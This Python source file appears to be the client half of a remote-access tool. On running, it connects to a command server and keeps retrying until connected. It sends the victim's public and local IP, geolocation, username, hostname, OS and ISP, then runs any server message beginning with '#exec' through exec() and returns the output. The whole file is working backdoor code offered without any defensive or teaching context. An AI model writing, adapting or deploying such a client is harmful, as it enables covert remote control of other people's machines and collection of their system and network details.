from datetime import datetime
from io import StringIO
import platform
import requests
import getpass
import socket
import time
import sys
import os

server_host = "127.0.0.1"
server_port = 65535
reconnect_delay = 10
ip_api_url = "https://ipinfo.io/json"


def connect_server():
    global client_socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (server_host, server_port)

    print(f"[{datetime.now():%X}] Connecting to server...")
    while True:
        try:
            client_socket.connect(server_address)
            print(f"[{datetime.now():%X}] Connected to server")
            break
        except:
            time.sleep(reconnect_delay)


def get_client_info():
    try:
        response = requests.get(ip_api_url)
        data = response.json()

        country = data.get("country")
        city = data.get("city")
        location = f"{country}/{city}"

        public_ip = data.get("ip")
        local_ip = socket.gethostbyname(socket.gethostname())
        ip = f"{public_ip}/{local_ip}"

        username = getpass.getuser()
        hostname = socket.gethostname()
        user = f"{username}@{hostname}"

        system_info = platform.uname()
        os = f"{system_info.system} {system_info.release} {system_info.version}"

        org = data.get("org")

        return location, ip, user, os, org
    except Exception as e:
        print(f"[{datetime.now():%X}] Error getting client info: {e}")
        return None, None, None, None, None


def client():
    connect_server()

    while True:
        try:
            location, ip, user, os, org = get_client_info()

            message = f"{location}\n{ip}\n{user}\n{os}\n{org}".encode()
            client_socket.sendall(message)
            print(f"[{datetime.now():%X}] SEND    {message}")

            while True:
                data = client_socket.recv(1024)
                decoded_data = data.decode()
                print(f"[{datetime.now():%X}] RECEIVE {data}")

                client_port = client_socket.getsockname()[1]
                print(ip.split("/")[0], client_port)
                if decoded_data.startswith("#exec\n") or decoded_data.startswith(f"#exec {ip.split("/")[0]}:{client_port}\n"):
                    try:
                        output_capture = StringIO()
                        sys.stdout = output_capture

                        exec(decoded_data)

                        captured_output = output_capture.getvalue()
                        sys.stdout = sys.__stdout__
                        if captured_output:
                            client_socket.sendall(captured_output.encode())
                            print(
                                f"[{datetime.now():%X}] SEND    {captured_output.encode()}"
                            )
                    except Exception as e:
                        if e:
                            client_socket.sendall(e.encode())
                        else:
                            client_socket.sendall("error".encode())

        except ConnectionError:
            print(f"[{datetime.now():%X}] Connection error")
            connect_server()


if __name__ == "__main__":
    client()
